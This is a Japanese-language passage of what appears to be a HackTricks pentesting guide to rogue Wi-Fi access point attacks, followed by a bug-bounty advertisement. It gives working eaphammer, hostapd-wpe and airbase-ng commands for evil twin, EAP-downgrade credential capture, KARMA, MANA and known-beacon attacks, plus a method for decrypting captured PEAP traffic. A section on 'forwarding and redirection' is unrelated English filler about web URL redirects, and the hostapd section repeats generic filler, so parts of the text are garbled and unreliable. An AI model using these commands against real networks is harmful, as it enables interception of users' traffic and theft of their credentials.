802.11プロトコルは、ステーションがESSに参加する方法を指定する非常に具体的なルールを持っていますが、ステーションがどのESSに接続するかを選択する方法は指定していません。さらに、プロトコルは、同じESSを共有するアクセスポイント間でステーションが自由にローミングできるようにします（建物の一方から他方に移動する際にWiFi接続が失われることは望ましくありません）。ただし、802.11プロトコルはこれらのアクセスポイントがどのように選択されるべきかを指定していません。さらに、ステーションはアクセスポイントに関連付けるためにESSに認証されなければならないが、802.11プロトコルはアクセスポイントがステーションに認証されることを要求していません。

### 優先ネットワークリスト（PNL）

ステーションがワイヤレスネットワークに接続するたびに、ネットワークのESSIDはステーションの優先ネットワークリスト（PNL）に保存されます。 PNLは、ステーションが過去に接続したすべてのネットワークの順序付きリストであり、PNLの各エントリにはネットワークのESSIDと接続を確立するために必要なネットワーク固有の設定情報が含まれています。

### パッシブスキャン

インフラストラクチャネットワークでは、アクセスポイントは定期的にビーコンフレームを送信して周辺のステーションに存在と機能を広告します。ビーコンはブロードキャストフレームであり、つまり、範囲内のすべての近くのステーションに受信されることを意味します。ビーコンには、APのサポートされるレート、暗号化の機能、追加情報などが含まれており、最も重要なのは、ビーコンフレームにAPのESSIDが含まれていることです（ESSIDのブロードキャストが無効にされていない限り）。

パッシブスキャン中、クライアントデバイスは近くのアクセスポイントからのビーコンフレームを受信します。クライアントデバイスがPNLのESSIDフィールドと一致するESSIDを持つビーコンフレームを受信した場合、クライアントは自動的にビーコンフレームを送信したアクセスポイントに接続します。次に、現在ワイヤレスに接続されていないワイヤレスデバイスをターゲットにしたい場合、そのクライアントのPNLに少なくとも1つのエントリを知っている場合、そのエントリのESSIDを使用して独自のアクセスポイントを作成するだけで、クライアントを接続させることができます。

### アクティブプロービング

802.11で使用される2番目のネットワーク選択アルゴリズムはアクティブプロービングと呼ばれます。アクティブプロービングを使用するクライアントデバイスは、範囲内のAPが何であるか、およびその機能が何であるかを判断するために、継続的にプローブリクエストフレームを送信します。プローブリクエストには、直接指定されたものとブロードキャストされたものの2つの形式があります。直接指定されたプローブリクエストは特定のESSIDに宛てられ、特定のネットワークが近くにあるかどうかをクライアントが確認する方法です。

直接指定されたプローブリクエストを使用するクライアントは、PNLの各ネットワークに対してプローブリクエストを送信します。なお、直接指定されたプロービングは近くの非表示ネットワークの存在を特定する唯一の方法であることに注意してください。ブロードキャストプローブリクエストはほぼ同じ方法で機能しますが、SSIDフィールドがNULLに設定されています。これにより、ブロードキャストプローブが近くのすべてのアクセスポイントに送信され、ステーションはPNLのいずれかの優先ネットワークが近くにあるかどうかを確認できますが、PNLの内容は明らかにされません。

## インターネットへのリダイレクトを備えたシンプルなAP

より複雑な攻撃の実行方法を説明する前に、単にAPを作成し、そのトラフィックをインターネットに接続されたインターフェースにリダイレクトする方法について説明します。

`ifconfig -a`を使用して、APを作成するためのwlanインターフェースとインターネットに接続されたインターフェースが存在することを確認します。

### DHCP＆DNS
```bash
apt-get install dnsmasq #Manages DHCP and DNS
```
以下のように、_/etc/dnsmasq.conf_という設定ファイルを作成します:

```plaintext
# Configuration file for dnsmasq.

# Specify interface to listen on
interface=wlan0

# Specify the DHCP range
dhcp-range=192.168.0.100,192.168.0.200,12h

# Specify the DNS server
server=8.8.8.8
```

この設定ファイルでは、dnsmasqを使用して以下の設定を行います:

- リスンするインターフェースを指定します。
- DHCPの範囲を指定します。
- DNSサーバーを指定します。
```
interface=wlan0
dhcp-authoritative
dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1
server=8.8.8.8
log-queries
log-dhcp
listen-address=127.0.0.1
```
次に、IPアドレスとルートを設定します。
```
ifconfig wlan0 up 192.168.1.1 netmask 255.255.255.0
route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1
```
そして、dnsmasqを**起動**します：
```
dnsmasq -C dnsmasq.conf -d
```
### hostapd

hostapdは、Linuxベースのシステムで使用されるツールです。このツールは、ワイヤレスアクセスポイント（AP）を作成するために使用されます。hostapdを使用すると、ワイヤレスネットワークの設定やセキュリティオプションの管理が可能です。

hostapdは、さまざまなセキュリティプロトコルをサポートしており、WPA2-PSKやWPA3-PSKなどの暗号化方式を使用することができます。また、MACアドレスフィルタリングやクライアントの接続制限など、さまざまなセキュリティ機能も提供しています。

hostapdは、ペネトレーションテストやセキュリティオーディットの際に、ワイヤレスネットワークのセキュリティをテストするために使用されます。ハッカーは、hostapdを使用して、ワイヤレスネットワークに対する攻撃や脆弱性のテストを行うことができます。

hostapdの設定は、`hostapd.conf`という設定ファイルを使用して行います。この設定ファイルには、ネットワークのSSID、パスワード、暗号化方式などの情報を指定します。設定ファイルを編集することで、ワイヤレスネットワークの動作やセキュリティ設定をカスタマイズすることができます。

hostapdは、ワイヤレスネットワークのセキュリティをテストするための重要なツールです。ハッカーは、hostapdを使用して、ワイヤレスネットワークの脆弱性を特定し、セキュリティを向上させるための対策を講じることができます。
```
apt-get install hostapd
```
以下は、_hostapd.conf_という名前の設定ファイルです：

```plaintext
interface=wlan0
driver=nl80211
ssid=MyWiFiNetwork
hw_mode=g
channel=6
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
wpa=2
wpa_passphrase=MyPassword
wpa_key_mgmt=WPA-PSK
wpa_pairwise=TKIP
rsn_pairwise=CCMP
```

この設定ファイルを使用して、ホストアクセスポイントを構成することができます。
```
interface=wlan0
driver=nl80211
ssid=MITIWIFI
hw_mode=g
channel=11
macaddr_acl=0
ignore_broadcast_ssid=0
auth_algs=1
wpa=2
wpa_passphrase=mitmwifi123
wpa_key_mgmt=WPA-PSK
wpa_pairwise=CCMP
wpa_group_rekey=86400
ieee80211n=1
wme_enabled=1
```
**厄介なプロセスを停止**し、**モニターモード**を設定し、**hostapdを起動**します。
```
airmon-ng check kill
iwconfig wlan0 mode monitor
ifconfig wlan0 up
hostapd ./hostapd.conf
```
### フォワーディングとリダイレクション

Forwarding and redirection are techniques used in web applications to redirect users from one URL to another. These techniques can be used for various purposes, such as improving user experience, handling URL changes, or implementing security measures.

#### Forwarding

Forwarding is the process of redirecting a user's request from one URL to another URL on the server side. This can be done using server-side scripting languages like PHP, Python, or JavaScript. 

There are two types of forwarding: 

1. **Client-side forwarding**: In this type of forwarding, the server sends a response to the client with a new URL, and the client's browser automatically redirects to the new URL. This is achieved using the `Location` header in the HTTP response.

2. **Server-side forwarding**: In this type of forwarding, the server receives a request from the client and internally forwards it to another URL. The client is unaware of this internal forwarding and continues to interact with the original URL.

Forwarding can be used for various purposes, such as redirecting users to a different page after a successful login, redirecting users to a mobile version of a website, or redirecting users to a different domain.

#### Redirection

Redirection is the process of automatically redirecting a user's request from one URL to another URL. This can be achieved using HTTP status codes, such as 301 (Moved Permanently) or 302 (Found), along with the `Location` header in the HTTP response.

Redirection can be used for various purposes, such as handling URL changes, redirecting users from an old website to a new website, or implementing security measures to prevent unauthorized access.

It is important to note that both forwarding and redirection can be misused by attackers to perform phishing attacks or to redirect users to malicious websites. Therefore, it is crucial to implement proper security measures, such as input validation and secure coding practices, to prevent such attacks.
```bash
iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE
iptables --append FORWARD --in-interface wlan0 -j ACCEPT
echo 1 > /proc/sys/net/ipv4/ip_forward
```
## イービルツイン

イービルツイン攻撃は、ほとんどのコンピュータやスマートフォンがワイヤレスネットワークの「名前」またはESSID（拡張サービスセット識別子）しか見ることができないという事実を利用したWi-Fi攻撃の一種です（基地局はクライアントに対して認証を行う必要がないため）。これにより、同じ名前と同じ種類の暗号化を使用するネットワークを区別するのは非常に困難になります。実際には、多くのネットワークでは、ユーザーを混乱させずにアクセスを拡張するために、同じ名前を使用する複数のネットワーク拡張アクセスポイントが存在します。

クライアントの実装方法によって（802.11プロトコルでは、同じESS内のアクセスポイント間を自由にローミングすることが許可されていることを覚えておいてください）、デバイスを接続している基地局を変更することが可能です。これは、より良い信号を提供すること（常に可能ではありません）または元の基地局へのアクセスをブロックすること（認証解除パケット、ジャミング、またはその他のDoS攻撃など）によって行うことができます。

また、実際のワイヤレス展開では通常、単一のアクセスポイントよりも複数のアクセスポイントがあり、これらのアクセスポイントは天井に向けて配置されるため、より強力で視野範囲が広い場合があります。単一のアクセスポイントを認証解除すると、ターゲットは通常、ローグAPではなく別の有効なアクセスポイントにローミングする結果となります（近くのすべてのアクセスポイントが認証解除される（大音量）場合や、ローグAPの配置に非常に注意する（困難）場合を除く）。

次の手順で、非常に基本的なオープンイービルツイン（インターネットへのトラフィックのルーティング機能なし）を作成できます。
```bash
airbase-ng -a 00:09:5B:6F:64:1E --essid "Elroy" -c 1 wlan0mon
```
**eaphammer**を使用してEvil Twinを作成することもできます（eaphammerを使用してEvil Twinを作成するには、インターフェースは**モニターモードではない**ことに注意してください）:
```
./eaphammer -i wlan0 --essid exampleCorp --captive-portal
```
または、Airgeddonを使用する場合は、`オプション：5,6,7,8,9（Evil Twin攻撃メニュー内）`です。

![](<../../.gitbook/assets/image (148).png>)

デフォルトでは、PNLのESSIDがWPAで保護されている場合、デバイスは自動的にオープンなEvil Twinに接続しません。実際のAPをDoS攻撃し、ユーザーが手動でオープンなEvil Twinに接続することを期待するか、実際のAPをDoS攻撃し、WPA Evil Twinを使用してハンドシェイクをキャプチャすることができます（この方法では、PSKを知らないため、被害者を接続させることはできませんが、ハンドシェイクをキャプチャして解読を試みることができます）。

_一部のOSとAVは、オープンなネットワークに接続することは危険であるとユーザーに警告する場合があります..._

### WPA/WPA2 Evil Twin

**WPA/2を使用したEvil Twin**を作成することができます。デバイスがWPA/2でそのSSIDに接続するように設定されている場合、接続を試みるでしょう。ただし、**4ウェイハンドシェイクを完了するには**、クライアントが使用する**パスワードを知る必要があります**。それを**知らない**場合、**接続は完了しません**。
```
./eaphammer -i wlan0 -e exampleCorp -c 11 --creds --auth wpa-psk --wpa-passphrase "mywifipassword"
```
### エンタープライズの偽のツイン

この攻撃を理解するためには、まず[WPAエンタープライズの説明](./#wpa-enterprise-mgt)を読むことをおすすめします。

**hostapd-wpeの使用**

`hostapd-wpe`は動作するために**設定**ファイルが必要です。これらの設定を自動化するために、[https://github.com/WJDigby/apd\_launchpad](https://github.com/WJDigby/apd\_launchpad)を使用することができます（_/etc/hostapd-wpe/_内のPythonファイルをダウンロードしてください）。
```
./apd_launchpad.py -t victim -s PrivateSSID -i wlan0 -cn company.com
hostapd-wpe ./victim/victim.conf -s
```
設定ファイルでは、ssid、チャネル、ユーザーファイル、証明書/キー、DHパラメータ、WPAバージョン、認証など、さまざまな項目を選択できます...

[**EAP-TLSを使用したhostapd-wpeを使用して、任意の証明書でログインを許可する方法**](evil-twin-eap-tls.md)

**EAPHammerの使用**
```bash
# Generate Certificates
./eaphammer --cert-wizard

# Launch Attack
./eaphammer -i wlan0 --channel 4 --auth wpa-eap --essid CorpWifi --creds
```
デフォルトでは、EAPHammerは次の認証方法を使用します（平文パスワードを取得するために最初にGTCを試し、その後より堅牢な認証方法を使用します）:
```
GTC,MSCHAPV2,TTLS-MSCHAPV2,TTLS,TTLS-CHAP,TTLS-PAP,TTLS-MSCHAP,MD5
```
これは、長い接続時間を避けるためのデフォルトの方法論です。ただし、最も弱い認証方法から最も強い方法まで、サーバーに認証方法を指定することもできます。
```
--negotiate weakest
```
または、次の方法も使用することができます：

* `--negotiate gtc-downgrade`は、高効率なGTCダウングレード実装（平文パスワード）を使用します。
* `--negotiate manual --phase-1-methods PEAP,TTLS --phase-2-methods MSCHAPV2,GTC,TTLS-PAP`は、手動で提供されるメソッドを指定します（攻撃対象の組織と同じ順序で同じ認証メソッドを提供することで、攻撃を検出することがより困難になります）。
* [詳細はwikiを参照してください](http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/)

**Airgeddonを使用する**

`Airgeddon`は、事前に生成された証明書を使用してWPA/WPA2-EnterpriseネットワークにEAP認証を提供することができます。偽のネットワークは接続プロトコルをEAP-MD5にダウングレードするため、ユーザーとパスワードのMD5を**キャプチャ**することができます。後で、攻撃者はパスワードを解読しようとすることができます。\
`Airggedon`は、**連続的なEvil Twin攻撃（ノイズあり）**または**誰かが接続するまでEvil Twin攻撃を作成するだけ（スムーズ）**の可能性を提供します。

![](<../../.gitbook/assets/image (129).png>)

### Evil Twins攻撃でのPEAPおよびEAP-TTLS TLSトンネルのデバッグ

_この方法はPEAP接続でテストされましたが、任意のTLSトンネルを復号化しているため、EAP-TTLSでも機能するはずです_

_hostapd-wpe_の**設定**内で、_**dh\_file**_を含む行を**コメントアウト**します（`dh_file=/etc/hostapd-wpe/certs/dh`から`#dh_file=/etc/hostapd-wpe/certs/dh`まで）。\
これにより、`hostapd-wpe`がDHの代わりにRSAを使用して鍵を交換するようになり、後でトラフィックを**サーバーの秘密鍵を知っている状態で**復号化することができます。

次に、通常どおりに変更された設定を使用して**Evil Twin**を**`hostapd-wpe`**で開始します。また、Evil Twin攻撃を実行している**インターフェース**で**`wireshark`**も開始します。

今すぐまたは後で（すでにいくつかの認証意図をキャプチャした場合）、wiresharkにプライベートRSAキーを追加できます：`Edit --> Preferences --> Protocols --> TLS --> (RSA keys list) Edit...`

新しいエントリを追加し、次の値を入力します：**IPアドレス = any** -- **ポート = 0** -- **プロトコル = data** -- **キーファイル**（キーファイルを選択し、問題が発生しないようにパスワードで保護されていないキーファイルを選択します）。

![](<../../.gitbook/assets/image (151).png>)

そして、新しい**「Decrypted TLS」タブ**を見てください：

![](<../../.gitbook/assets/image (152).png>)

## KARMA、MANA、Loud MANA、およびKnown beacons攻撃

### ESSIDおよびMACのブラック/ホワイトリスト

次の表は、使用されるときの効果を含むさまざまなタイプのMFACL（Management Frame Access Control Lists）とその効果をリストしています：

![](<../../.gitbook/assets/image (149).png>)
```
# example EAPHammer MFACL file, wildcards can be used
78:f0:97:fc:b5:36
9a:35:e1:01:4f:cf
69:19:14:60:20:45
ce:52:b8:*:*:*

[--mac-whitelist /path/to/mac/whitelist/file.txt #EAPHammer whitelisting]
[--mac-blacklist /path/to/mac/blacklist/file.txt #EAPHammer blacklisting]
```

```
# example ESSID-based MFACL file
apples
oranges
grapes
pears

[--ssid-whitelist /path/to/mac/whitelist/file.txt]
[--ssid-blacklist /path/to/mac/blacklist/file.txt]
```
### KARMA

KARMA攻撃は、ステーションが使用するネットワーク選択プロセスを悪用するローグアクセスポイント攻撃の一種です。2005年にDino Dai ZoviとShane Macaulayが執筆したホワイトペーパーで、攻撃者がアクセスポイントを設定して、指向性プローブリクエストを受信し、それに一致する指向性プローブレスポンスをすべて応答することができると説明しています。これにより、影響を受けるステーションは自動的に攻撃者のアクセスポイントに関連付けリクエストを送信します。アクセスポイントは関連付けレスポンスを返し、影響を受けるステーションは攻撃者に接続されます。

### MANA

Ian de VilliersとDominic Whiteによると、現代のステーションは、少なくとも1つのブロードキャストプローブリクエストに既に応答していないアクセスポイントからの指向性プローブレスポンスを無視することで、KARMA攻撃から自己保護するように設計されています。これにより、KARMA攻撃の脆弱性があるステーションの数は大幅に減少しました。しかし、2015年にWhiteとde Villiersは、そのような保護を回避する手段を開発しました。Whiteとde Villiersの改良されたKARMA攻撃（MANA攻撃）では、指向性プローブレスポンスを使用して近くのステーションのPNL（Preferred Network List）を再構築します。ステーションからブロードキャストプローブリクエストが受信されると、攻撃者のアクセスポイントは、そのデバイスのPNLに既に存在する指向性プローブからの任意のSSIDで応答します。

要約すると、MANAアルゴリズムは次のように機能します。アクセスポイントがプローブリクエストを受信するたびに、まずブロードキャストまたは指向性プローブかどうかを判断します。指向性プローブの場合、送信元のMACアドレスがハッシュテーブルに追加されます（まだ存在しない場合）し、ESSIDがそのデバイスのPNLに追加されます。その後、アクセスポイントは指向性プローブレスポンスを返します。ブロードキャストプローブの場合、アクセスポイントはそのデバイスのPNL内の各ネットワークに対してプローブレスポンスを返します。

eaphammerを使用したMANA攻撃：
```
./eaphammer -i wlan0 --cloaking full --mana --mac-whitelist whitelist.txt [--captive-portal] [--auth wpa-psk --creds]
```
### ラウドMANA

標準のMANA攻撃では、直接のプローブを使用しないデバイスを攻撃することはできません。したがって、デバイスのPNL内に事前にエントリがない場合、攻撃するための別の方法を見つける必要があります。

可能性としては、ラウドMANA攻撃があります。この攻撃は、物理的に近接しているクライアントデバイスは、少なくともいくつかの共通のエントリをPNLに持っている可能性があるという考えに基づいています。

要約すると、ラウドMANA攻撃では、特定のデバイスのPNL内の各ESSIDに対してプローブリクエストに応答する代わりに、不正なAPは以前に見たすべてのデバイスのすべてのPNLの各ESSIDに対してプローブレスポンスを送信します。集合論に関連して言えば、APは近くのデバイスのすべてのPNLの和集合内の各ESSIDに対してプローブレスポンスを送信すると言えます。
```
./eaphammer -i wlan0 --cloaking full --mana --loud [--captive-portal] [--auth wpa-psk --creds]
```
### 既知のビーコン攻撃

Loud MANA攻撃が成功しない場合もあります。\
既知のビーコン攻撃は、被害者が攻撃者に接続するようにするために、ESSIDを「ブルートフォース」する方法です。攻撃者は、任意のESSIDに応答するAPを作成し、ワードリスト内の各名前のESSIDを偽装したビーコンを送信するコードを実行します。被害者のPNL内にこれらのESSID名のいくつかが含まれていることを願って、被害者は偽のAPに接続しようとします。\
Eaphammerは、この攻撃をMANA攻撃として実装しており、リスト内のすべてのESSIDが読み込まれます（`--loud`と組み合わせてLoud MANA + 既知のビーコン攻撃を作成することもできます）。
```
./eaphammer -i wlan0 --mana [--loud] --known-beacons  --known-ssids-file wordlist.txt [--captive-portal] [--auth wpa-psk --creds]
```
**既知のビーコンバースト攻撃**

既知のビーコンは騒々しいです。Eaphammerプロジェクト内のスクリプトを使用して、ファイル内のすべてのESSID名のビーコンを非常に迅速に発信することができます。このスクリプトをEaphammer MANA攻撃と組み合わせると、クライアントはあなたのAPに接続することができます。
```
# transmit a burst of 5 forged beacon packets for each entry in list
./forge-beacons -i wlan1 \
--bssid de:ad:be:ef:13:37 \
--known-essids-file known-s.txt \
--dst-addr 11:22:33:11:22:33 \
--burst-count 5
```
## Wi-Fi Direct（Wi-Fiダイレクト）

Wi-Fi Directは、ワイヤレスAPなしでデバイス同士を接続するためのWi-Fi標準です。2つのデバイスのうちの1つがAP（グループオーナーと呼ばれる）として機能します。プリンターやテレビなど、多くのIoTデバイスでWi-Fi Directが使用されています。

Wi-Fi Directは、デバイスを安全に接続するためにWi-Fi Protected Setup（WPS）に依存しています。WPSには、**Push-Button** Configuration（PBC）、**PIN entry**、**Near-Field** Communication（NFC）など、複数の設定方法があります。

したがって、WPS PINに対する以前の攻撃は、ここでも有効です（PINが使用されている場合）。

### EvilDirectハイジャッキング

これはEvil-Twinのように機能しますが、Wi-Fi Direct用です。グループオーナーをなりすまして、他のデバイス（例：電話）が自分に接続するように仕向けることができます：`airbase-ng -c 6 -e DIRECT-5x-BRAVIA -a BB:BB:BB:BB:BB:BB mon0`

## 参考文献

* [https://posts.specterops.io/modern-wireless-attacks-pt-i-basic-rogue-ap-theory-evil-twin-and-karma-attacks-35a8571550ee](https://posts.specterops.io/modern-wireless-attacks-pt-i-basic-rogue-ap-theory-evil-twin-and-karma-attacks-35a8571550ee)
* [https://posts.specterops.io/modern-wireless-attacks-pt-ii-mana-and-known-beacon-attacks-97a359d385f9](https://posts.specterops.io/modern-wireless-attacks-pt-ii-mana-and-known-beacon-attacks-97a359d385f9)
* [https://posts.specterops.io/modern-wireless-tradecraft-pt-iii-management-frame-access-control-lists-mfacls-22ca7f314a38](https://posts.specterops.io/modern-wireless-tradecraft-pt-iii-management-frame-access-control-lists-mfacls-22ca7f314a38)
* [https://posts.specterops.io/modern-wireless-tradecraft-pt-iv-tradecraft-and-detection-d1a95da4bb4d](https://posts.specterops.io/modern-wireless-tradecraft-pt-iv-tradecraft-and-detection-d1a95da4bb4d)
* [https://github.com/gdssecurity/Whitepapers/blob/master/GDS%20Labs%20-%20Identifying%20Rogue%20Access%20Point%20Attacks%20Using%20Probe%20Response%20Patterns%20and%20Signal%20Strength.pdf](https://github.com/gdssecurity/Whitepapers/blob/master/GDS%20Labs%20-%20Identifying%20Rogue%20Access%20Point%20Attacks%20Using%20Probe%20Response%20Patterns%20and%20Signal%20Strength.pdf)
* [http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/](http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/)
* [https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/](https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/)
* [https://medium.com/hacking-info-sec/ataque-clientless-a-wpa-wpa2-usando-pmkid-1147d72f464d](https://medium.com/hacking-info-sec/ataque-clientless-a-wpa-wpa2-usando-pmkid-1147d72f464d)

TODO: [https://github.com/wifiphisher/wifiphisher](https://github.com/wifiphisher/wifiphisher)を確認する（FacebookでのログインとキャプティブポータルでのWPAの模倣）

<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

**HackenProofはすべての暗号バグバウンティの場所です。**

**遅延なしで報酬を受け取る**\
HackenProofのバウンティは、顧客が報酬予算を入金した後に開始されます。バグが検証された後に報酬を受け取ることができます。

**Web3ペントestingの経験を積む**\
ブロックチェーンプロトコルとスマートコントラクトは新しいインターネットです！成長するWeb3セキュリティをマスターしましょう。

**Web3ハッカーレジェンドになる**\
各検証済みのバグで評判ポイントを獲得し、週間リーダーボードのトップを制覇しましょう。

[**HackenProofでサインアップ**](https://hackenproof.com/register)してハッキングから報酬を得ましょう！

{% embed url="https://hackenproof.com/register" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ企業で働いていますか？** **HackTricksで会社を宣伝**してみませんか？または、**PEASSの最新バージョンやHackTricksのPDFをダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見しましょう。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
* [**公式のPEASS＆HackTricksグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**Telegramグループ**](https://t.me/peass)に参加するか、**Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**をフォロー**しましょう。
* **ハッキングのトリックを共有するには、**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **にPRを提出**してください。

</details>
